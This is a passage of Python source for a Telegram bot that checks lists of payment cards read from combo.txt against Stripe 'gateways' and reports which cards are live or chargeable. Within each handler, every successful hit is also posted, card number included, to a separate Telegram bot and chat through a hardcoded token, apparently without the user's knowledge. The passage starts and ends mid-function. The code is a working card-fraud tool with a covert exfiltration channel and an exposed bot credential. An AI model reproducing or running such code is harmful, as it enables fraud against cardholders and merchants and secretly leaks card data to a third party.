◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @Moha_Azouz
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
					msgf=f'''<b>𝑰𝑵𝑺𝑼𝑭𝑭𝑰𝑪𝑰𝑬𝑵𝑻 𝑭𝑼𝑵𝑫𝑺 ☑️
			- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {last}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @Moha_Azouz
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
					if 'success' in last:
						tok = '7256336819:AAGOA4MBllwqF0XrP44Nfl1lS8xQK9Vb8GY'
						acc =  '-1002111411217'
						mg = f"""<b> 
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ {cc[:6]}
｢𝙸𝙽𝙵𝙾」➔ {brand} - {card_type} - {level}
｢𝙱𝙰𝙽𝙺」➔ {bank}
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @Moha_Azouz  
</b>"""
						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
						tlg_params = {"parse_mode": "HTML"}

						i = requests.post(tlg, params=tlg_params)
						ch += 1
						bot.send_message(call.from_user.id, msg)
					elif "funds" in last:
						tok = '7256336819:AAGOA4MBllwqF0XrP44Nfl1lS8xQK9Vb8GY'
						acc =  '-1002111411217'
						mg = f"""<b> 
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ {cc[:6]}
｢𝙸𝙽𝙵𝙾」➔ {brand} - {card_type} - {level}
｢𝙱𝙰𝙽𝙺」➔ {bank}
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @Moha_Azouz  
</b>"""
						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
						tlg_params = {"parse_mode": "HTML"}

						i = requests.post(tlg, params=tlg_params)
						bot.send_message(call.from_user.id, msgf)
						live+=1
					elif "card's security" in last:
						tok = '7256336819:AAGOA4MBllwqF0XrP44Nfl1lS8xQK9Vb8GY'
						acc =  '-1002111411217'
						mg = f"""<b> 
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ {cc[:6]}
｢𝙸𝙽𝙵𝙾」➔ {brand} - {card_type} - {level}
｢𝙱𝙰𝙽𝙺」➔ {bank}
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @Moha_Azouz  
</b>"""
						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
						tlg_params = {"parse_mode": "HTML"}

						i = requests.post(tlg, params=tlg_params)
						ccnn+=1
						bot.send_message(call.from_user.id, msgc)
					else:
						dd += 1
					time.sleep(5)
		except Exception as e:
			print(e)
		stopuser[f'{id}']['status'] = 'start'
		bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text='𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗕𝗬 ➜ @Moha_Azouz')
	my_thread = threading.Thread(target=my_function)
	my_thread.start()

@bot.callback_query_handler(func=lambda call: call.data == 'sta')
def menu_callback(call):
	def my_function():
		id=call.from_user.id
		gate='stripe auth'
		dd = 0
		live = 0
		ch = 0
		ccnn = 0
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛")
		try:
			with open("combo.txt", 'r') as file:
				lino = file.readlines()
				total = len(lino)
				try:
					stopuser[f'{id}']['status'] = 'start'
				except:
					stopuser[f'{id}'] = {
				'status': 'start'
			}
				for cc in lino:
					if stopuser[f'{id}']['status'] == 'stop':
						bot.edit_message_text(chat_id=call.chat.id, message_id=ko, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗕𝗬 ➜ @Moha_Azouz')
						return
					try:
						data = requests.get('https://lookup.binlist.net/'+cc[:6]).json()
					except:
						pass
					try:
					    level=(data['level'])
					except:
					    level=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						bank=(data['bank']['name'])
					except:
						bank=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						country_flag=(data['country']['emoji'])
					except:
						country_flag=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						country=(data['country']['name'])
					except:
						country=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						brand=(data['scheme'])
					except:
						brand=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						card_type=(data['type'])
					except:
						card_type=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						url=(data['bank']['url'])
					except:
						url=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					
					start_time = time.time()
					try:
						last = str(Medo(cc))
					except Exception as e:
						print(e)
						last = "ERROR"
					if 'risk' in last:
						last='declined'
					elif 'Duplicate' in last:
						last='live'
					mes = types.InlineKeyboardMarkup(row_width=1)
					cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
					status = types.InlineKeyboardButton(f"• 𝙎𝙏𝘼𝙏𝙐𝙎 ➜ {last} •", callback_data='u8')
					cm3 = types.InlineKeyboardButton(f"• 𝑪𝑯𝑨𝑹𝑮𝑬 ✅ ➜ [ {ch} ] •", callback_data='x')
					ccn = types.InlineKeyboardButton(f"• 𝘾𝘾𝙉 ☑️ ➜ [ {ccnn} ] •", callback_data='x')
					cm4 = types.InlineKeyboardButton(f"• 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌ ➜ [ {dd} ] •", callback_data='x')
					risk = types.InlineKeyboardButton(f"• 𝑰𝑵𝑺𝑼𝑭𝑭𝑰𝑪𝑰𝑬𝑵𝑻 𝑭𝑼𝑵𝑫𝑺 ☑️ ➜ [ {live} ] •", callback_data='x')
					cm5 = types.InlineKeyboardButton(f"• 𝙏𝙊𝙏𝘼𝙇 👻 ➜ [ {total} ] •", callback_data='x')
					stop=types.InlineKeyboardButton(f"[ 𝙎𝙏𝙊𝙋 ]", callback_data='stop')
					mes.add(cm1,status, cm3,ccn,risk, cm4, cm5, stop)
					end_time = time.time()
					execution_time = end_time - start_time
					bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text=f'''𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 𝙒𝙝𝙞𝙡𝙚 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨 𝘼𝙧𝙚 𝘽𝙚𝙞𝙣𝙜 𝘾𝙝𝙚𝙘𝙠 𝘼𝙩 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 {gate}
𝘽𝙤𝙩 𝘽𝙮 @Moha_Azouz''', reply_markup=mes)

					msg=f'''<b>𝑪𝑯𝑨𝑹𝑮𝑬 ✅
			- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {last}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @Moha_Azouz
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
					msgc=f'''<b>𝑪𝑪𝑵 ☑️
			- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {last}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @Moha_Azouz
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
					msgf=f'''<b>𝑰𝑵𝑺𝑼𝑭𝑭𝑰𝑪𝑰𝑬𝑵𝑻 𝑭𝑼𝑵𝑫𝑺 ☑️
			- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {last}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @Moha_Azouz
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
					if 'success' in last:
						tok = '7256336819:AAGOA4MBllwqF0XrP44Nfl1lS8xQK9Vb8GY'
						acc =  '-1002111411217'
						mg = f"""<b> 
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ {cc[:6]}
｢𝙸𝙽𝙵𝙾」➔ {brand} - {card_type} - {level}
｢𝙱𝙰𝙽𝙺」➔ {bank}
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @Moha_Azouz  
</b>"""
						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
						tlg_params = {"parse_mode": "HTML"}

						i = requests.post(tlg, params=tlg_params)
						ch += 1
						bot.send_message(call.from_user.id, msg)
					elif "funds" in last:
						tok = '7256336819:AAGOA4MBllwqF0XrP44Nfl1lS8xQK9Vb8GY'
						acc =  '-1002111411217'
						mg = f"""<b> 
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ {cc[:6]}
｢𝙸𝙽𝙵𝙾」➔ {brand} - {card_type} - {level}
｢𝙱𝙰𝙽𝙺」➔ {bank}
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @Moha_Azouz  
</b>"""
						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
						tlg_params = {"parse_mode": "HTML"}

						i = requests.post(tlg, params=tlg_params)
						bot.send_message(call.from_user.id, msgf)
						live+=1
					elif "card's security" in last:
						tok = '7256336819:AAGOA4MBllwqF0XrP44Nfl1lS8xQK9Vb8GY'
						acc =  '-1002111411217'
						mg = f"""<b> 
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ {cc[:6]}
｢𝙸𝙽𝙵𝙾」➔ {brand} - {card_type} - {level}
｢𝙱𝙰𝙽𝙺」➔ {bank}
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @Moha_Azouz  
</b>"""
						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
						tlg_params = {"parse_mode": "HTML"}

						i = requests.post(tlg, params=tlg_params)
						ccnn+=1
						bot.send_message(call.from_user.id, msgc)
					else:
						dd += 1
					time.sleep(5)
		except Exception as e:
			print(e)
		stopuser[f'{id}']['status'] = 'start'
		bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text='𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗕𝗬 ➜ @Moha_Azouz')
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
	
	
@bot.callback_query_handler(func=lambda call: call.data == 'spe')
def menu_callback(call):
	def my_function():
		id=call.from_user.id
		gate='stripe 1$'
		dd = 0
		live = 0
		ch = 0
		ccnn = 0
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛")
		try:
			with open("combo.txt", 'r') as file:
				lino = file.readlines()
				total = len(lino)
				try:
					stopuser[f'{id}']['status'] = 'start'
				except:
					stopuser[f'{id}'] = {
				'status': 'start'
			}
				for cc in lino:
					if stopuser[f'{id}']['status'] == 'stop':
						bot.edit_message_text(chat_id=call.chat.id, message_id=ko, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗕𝗬 ➜ @Moha_Azouz')
						return
					try:
						data = requests.get('https://lookup.binlist.net/'+cc[:6]).json()
					except:
						pass
					try:
					    level=(data['level'])
					except:
					    level=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						bank=(data['bank']['name'])
					except:
						bank=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						country_flag=(data['country']['emoji'])
					except:
						country_flag=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						country=(data['country']['name'])
					except:
						country=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						brand=(data['scheme'])
					except:
						brand=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						card_type=(data['type'])
					except:
						card_type=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						url=(data['bank']['url'])
					except:
						url=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					
					start_time = time.time()
					try:
						last = str(sp(cc))
					except Exception as e:
						print(e)
						last = "ERROR"
					if 'risk' in last:
						last='declined'
					elif 'Duplicate' in last:
						last='live'
					mes = types.InlineKeyboardMarkup(row_width=1)
					cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
					status = types.InlineKeyboardButton(f"• 𝙎𝙏𝘼𝙏𝙐𝙎 ➜ {last} •", callback_data='u8')
					cm3 = types.InlineKeyboardButton(f"• 𝑪𝑯𝑨𝑹𝑮𝑬 ✅ ➜ [ {ch} ] •", callback_data='x')
					ccn = types.InlineKeyboardButton(f"• 𝘾𝘾𝙉 ☑️ ➜ [ {ccnn} ] •", callback_data='x')
					cm4 = types.InlineKeyboardButton(f"• 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌ ➜ [ {dd} ] •", callback_data='x')
					risk = types.InlineKeyboardButton(f"• 𝑰𝑵𝑺𝑼𝑭𝑭𝑰𝑪𝑰𝑬𝑵𝑻 𝑭𝑼𝑵𝑫𝑺 ☑️ ➜ [ {live} ] •", callback_data='x')
					cm5 = types.InlineKeyboardButton(f"• 𝙏𝙊𝙏𝘼𝙇 👻 ➜ [ {total} ] •", callback_data='x')
					stop=types.InlineKeyboardButton(f"[ 𝙎𝙏𝙊𝙋 ]", callback_data='stop')
					mes.add(cm1,status, cm3,ccn,risk, cm4, cm5, stop)
					end_time = time.time()
					execution_time = end_time - start_time
					bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text=f'''𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 𝙒𝙝𝙞𝙡𝙚 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨 𝘼𝙧𝙚 𝘽𝙚𝙞𝙣𝙜 𝘾𝙝𝙚𝙘𝙠 𝘼𝙩 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 {gate}
𝘽𝙤𝙩 𝘽𝙮 @Moha_Azouz''', reply_markup=mes)

					msg=f'''<b>𝑪𝑯𝑨𝑹𝑮𝑬 ✅
			- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {last}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @Moha_Azouz
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
					msgc=f'''<b>𝑪𝑪𝑵 ☑️
			- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {last}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @Moha_Azouz
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
					msgf=f'''<b>𝑰𝑵𝑺𝑼𝑭𝑭𝑰𝑪𝑰𝑬𝑵𝑻 𝑭𝑼𝑵𝑫𝑺 ☑️
			- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑪𝑨𝑹𝑫  ➜ <code>{cc}</code>
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gate}
◆ 𝑹𝑬𝑺𝑷𝑶𝑵𝑺𝑬 ➜ {last}
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @Moha_Azouz
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
					if 'success' in last:
						tok = '7256336819:AAGOA4MBllwqF0XrP44Nfl1lS8xQK9Vb8GY'
						acc =  '-1002111411217'
						mg = f"""<b> 
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ {cc[:6]}
｢𝙸𝙽𝙵𝙾」➔ {brand} - {card_type} - {level}
｢𝙱𝙰𝙽𝙺」➔ {bank}
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @Moha_Azouz  
</b>"""
						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
						tlg_params = {"parse_mode": "HTML"}

						i = requests.post(tlg, params=tlg_params)
						ch += 1
						bot.send_message(call.from_user.id, msg)
					elif "funds" in last:
						tok = '7256336819:AAGOA4MBllwqF0XrP44Nfl1lS8xQK9Vb8GY'
						acc =  '-1002111411217'
						mg = f"""<b> 
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ {cc[:6]}
｢𝙸𝙽𝙵𝙾」➔ {brand} - {card_type} - {level}
｢𝙱𝙰𝙽𝙺」➔ {bank}
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @Moha_Azouz  
</b>"""
						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
						tlg_params = {"parse_mode": "HTML"}

						i = requests.post(tlg, params=tlg_params)
						bot.send_message(call.from_user.id, msgf)
						live+=1
					elif "card's security" in last:
						tok = '7256336819:AAGOA4MBllwqF0XrP44Nfl1lS8xQK9Vb8GY'
						acc =  '-1002111411217'
						mg = f"""<b> 
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ {cc[:6]}
｢𝙸𝙽𝙵𝙾」➔ {brand} - {card_type} - {level}
｢𝙱𝙰𝙽𝙺」➔ {bank}
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @Moha_Azouz  
</b>"""
						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
						tlg_params = {"parse_mode": "HTML"}

						i = requests.post(tlg, params=tlg_params)
						ccnn+=1
						bot.send_message(call.from_user.id, msgc)
					else:
						dd += 1
					time.sleep(5)
		except Exception as e:
			print(e)
		stopuser[f'{id}']['status'] = 'start'
		bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text='𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗕𝗬 ➜ @Moha_Azouz')
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
	
@bot.callback_query_handler(func=lambda call: call.data == 'bon')
def menu_callback(call):
	def my_function():
		id=call.from_user.id
		gate='𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘2'
		dd = 0
		live = 0
		riskk = 0
		ccnn = 0
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛")
		try:
			with open("combo.txt", 'r') as file:
				lino = file.readlines()
				total = len(lino)
				try:
					stopuser[f'{id}']['status'] = 'start'
				except:
					stopuser[f'{id}'] = {
				'status': 'start'
			}
				for cc in lino:
					if stopuser[f'{id}']['status'] == 'stop':
						bot.edit_message_text(chat_id=call.chat.id, message_id=ko, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗕𝗬 ➜ @Moha_Azouz')
						return
					try:
						data = requests.get('https://lookup.binlist.net/'+cc[:6]).json()
						
						
					except:
						pass
					try:
						level=(data['level'])
					except:
												level=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						bank=(data['bank']['name'])
					except:
						bank=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						country_flag=(data['country']['emoji'])
					except:
						country_flag=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						country=(data['country']['name'])
					except:
						country=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						brand=(data['scheme'])
					except:
						brand=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						card_type=(data['type'])
					except:
						card_type=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						url=(data['bank']['url'])
					except:
						url=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					
					start_time = time.time()
					try:
						last = str(ch(cc))
					except Exception as e:
						print(e)
						last = "ERROR"
					if 'risk' in last:
						last='declined'
					elif 'Duplicate' in last:
						last='Approved'
					mes = types.InlineKeyboardMarkup(row_width=1)
					cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
					status = types.InlineKeyboardButton(f"• 𝙎𝙏𝘼𝙏𝙐𝙎 ➜ {last} •", callback_data='u8')
